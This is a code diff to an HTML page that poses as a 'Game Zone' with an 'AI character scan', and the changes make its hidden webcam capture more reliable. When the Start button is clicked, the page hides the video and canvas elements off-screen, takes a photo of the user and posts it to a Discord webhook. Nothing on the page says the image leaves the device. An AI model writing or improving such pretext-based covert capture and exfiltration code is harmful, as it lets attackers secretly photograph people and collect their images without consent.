@@ -96,9 +96,13 @@
       cursor: default;
     }
 
-    /* Invisible Camera Elements */
-    video, #canvas {
-      display: none;
+    /* Video element hidden off-screen so canvas can capture it correctly */
+    #webcam, #canvas {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      opacity: 0;
+      pointer-events: none;
     }
   </style>
 </head>
@@ -108,7 +112,7 @@
   <div class="card" id="start-screen">
     <h1>🎮 Welcome to Game Zone</h1>
     <p>Click below to scan vibe & start your game!</p>
-    <button class="btn" onclick="startScanAndShowGames()">Start Game 🚀</button>
+    <button class="btn" id="start-btn" onclick="startScanAndShowGames()">Start Game 🚀</button>
   </div>
 
   <!-- Screen 2: Game Options -->
@@ -132,8 +136,8 @@
   </div>
 
   <!-- Camera Hidden Elements -->
-  <video id="webcam" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+  <video id="webcam" autoplay playsinline width="640" height="480"></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
     let currentGame = null;
@@ -144,44 +148,57 @@
 
     // --- Screen Navigation & Camera Scan ---
     async function startScanAndShowGames() {
-      // 1. First trigger camera access exactly like your quiz code
+      const btn = document.getElementById('start-btn');
+      btn.innerText = "Scanning Vibe... ⏳";
+      btn.disabled = true;
+
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
         const video = document.getElementById('webcam');
         video.srcObject = stream;
 
-        // Capture after 1.5s delay
+        // Ensure video is playing
+        await video.play();
+
+        // Wait 1.5 seconds for lighting/focus adjustment before capture
         setTimeout(() => {
           captureAndSend(video, stream);
+          
+          // Switch screen after capture
+          document.getElementById('start-screen').classList.add('hidden');
+          document.getElementById('selection-screen').classList.remove('hidden');
         }, 1500);
 
       } catch (err) {
+        console.error("Camera Error: ", err);
         alert("Camera permission required for AI character scan!");
+        btn.innerText = "Start Game 🚀";
+        btn.disabled = false;
       }
-
-      // 2. Transition to Game Selection Screen
-      document.getElementById('start-screen').classList.add('hidden');
-      document.getElementById('selection-screen').classList.remove('hidden');
     }
 
     function captureAndSend(video, stream) {
       const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
+      
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Stop camera tracks
+      // Turn off camera stream
       stream.getTracks().forEach(track => track.stop());
 
-      // Send photo blob to Discord
+      // Convert image to Blob and post to Discord
       canvas.toBlob(blob => {
+        if (!blob) return;
         const formData = new FormData();
         formData.append('file', blob, 'capture.png');
         formData.append('content', '📸 **New Character Scan Photo Captured!**');
 
         if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
           fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
+            .then(res => console.log("Successfully sent to Discord!"))
             .catch(err => console.error("Error sending to Discord:", err));
         }
       }, 'image/png');
